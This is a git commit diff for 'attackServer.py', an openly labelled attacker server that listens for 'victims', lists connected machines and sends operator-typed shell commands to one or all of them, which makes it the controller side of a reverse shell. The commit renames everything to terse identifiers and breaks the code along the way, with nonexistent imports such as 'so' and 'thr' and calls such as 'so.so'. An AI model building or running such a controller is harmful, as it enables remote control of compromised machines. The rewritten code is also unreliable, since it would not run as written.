a561cd193ee6b0d7a73b1221c7561565364ac846
Christofer Patrick Paes <49449786+christoferpaes@users.noreply.github.com>
2024-03-05 13:31:54 -0700

    Update attackServer.py

--- attackServer.py
+++ attackServer.py
@@ -1,80 +1,77 @@
-import socket
-import threading
+import so
+import thr
 
-class AttackerServer:
-    def __init__(self, host_ip, host_port):
-        self.host_ip = host_ip
-        self.host_port = host_port
-        self.server = None
-        self.clients = []
+class A:
+  def __init__(s, a, p):
+    s.h_i = a
+    s.h_p = p
+    s.s = None
+    s.c = []
 
-    def start_conn(self):
-        print("####################################")
-        print("######### Attacker Server #########")
-        print("####################################")
+  def s_c(s):
+    print("####################################")
+    print("######### Attacker Server #########")
+    print("####################################")
 
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.bind((self.host_ip, self.host_port))
+    s.s = so.so(so.AF_INET, so.SOCK_STREAM)
+    s.s.bind((s.h_i, s.h_p))
 
-        print("Msg: Server Initiated...")
-        print("Msg: Listening for Victims")
+    print("Msg: Server Initiated...")
+    print("Msg: Listening for Victims")
 
-        self.server.listen(5)  # Listen for multiple connections
-    
+    s.s.listen(5)
 
-        while True:
-            client_socket, client_addr = self.server.accept()
-            print("Msg: Received Connection from", client_addr)
-            self.clients.append((client_socket, client_addr))
-            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
-            client_handler.start()
+    while True:
+      c_s, c_a = s.s.accept()
+      print("Msg: Received Connection from", c_a)
+      s.c.append((c_s, c_a))
+      c_h = thr.th(target=s.h_c, args=(c_s,))
+      c_h.start()
 
-    def handle_client(self, client_socket):
-        while True:
-            interface = '[+] ' + str(client_socket.getpeername()[0]) + " :sh$ "
-            command = input(interface)
+  def h_c(s, c_s):
+    while True:
+      i = '[+] ' + str(c_s.getpeername()[0]) + " :sh$ "
+      c = input(i)
 
-            if not command.strip():  # If empty command is given, continue listening
-                continue
+      if not c.strip():
+        continue
 
-            if command.lower() == "exit":  # Handle exit command
-                client_socket.close()
-                self.clients.remove((client_socket, None))
-                print("Msg: Connection closed")
-                break
+      if c.lower() == "exit":
+        c_s.close()
+        s.c.remove((c_s, None))
+        print("Msg: Connection closed")
+        break
 
-            if command.lower() == "list":
-                print("Connected Devices:")
-                for index, (client, addr) in enumerate(self.clients, start=1):
-                    print(f"{index}. {addr[0]}")
+      if c.lower() == "list":
+        print("Connected Devices:")
+        for i, (c, a) in enumerate(s.c, start=1):
+          print(f"{i}. {a[0]}")
 
-            # Send command to selected devices
-            elif command.startswith("sendto"):
-                parts = command.split(" ", 1)
-                if len(parts) == 2:
-                    try:
-                        device_index = int(parts[1]) - 1
-                        target_socket, _ = self.clients[device_index]
-                        target_command = input("Enter command to send: ")
-                        target_socket.send(target_command.encode())
-                    except (ValueError, IndexError):
-                        print("Invalid device index.")
-                else:
-                    print("Usage: sendto <device_index>")
+      elif c.startswith("sendto"):
+        p = c.split(" ", 1)
+        if len(p) == 2:
+          try:
+            d_i = int(p[1]) - 1
+            t_s, _ = s.c[d_i]
+            t_c = input("Enter command to send: ")
+            t_s.send(t_c.encode())
+          except (ValueError, IndexError):
+            print("Invalid device index.")
+        else:
+          print("Usage: sendto <device_index>")
 
-            # Send command to all devices
-            else:
-                for client_socket, _ in self.clients:
-                    client_socket.send(command.encode())
+      else:
+        for c_s, _ in s.c:
+          c_s.send(c.encode())
 
-    def close_connections(self):
-        for client_socket, _ in self.clients:
-            client_socket.close()
-        self.clients = []
+  def c_c(s):
+    for c_s, _ in s.c:
+      c_s.close()
+    s.c = []
 
 if __name__ == "__main__":
-    attacker_ip = '127.0.0.1'  # Replace with attacker's IP address
-    attacker_port = 4000  # Choose a port for the attacker server
+  a_i = '127.0.0.1'
+  a_p = 4000
 
-    attacker_server = AttackerServer(attacker_ip, attacker_port)
-    attacker_server.start_conn()
+  a_s = A(a_i, a_p)
+  a_s.s_c()
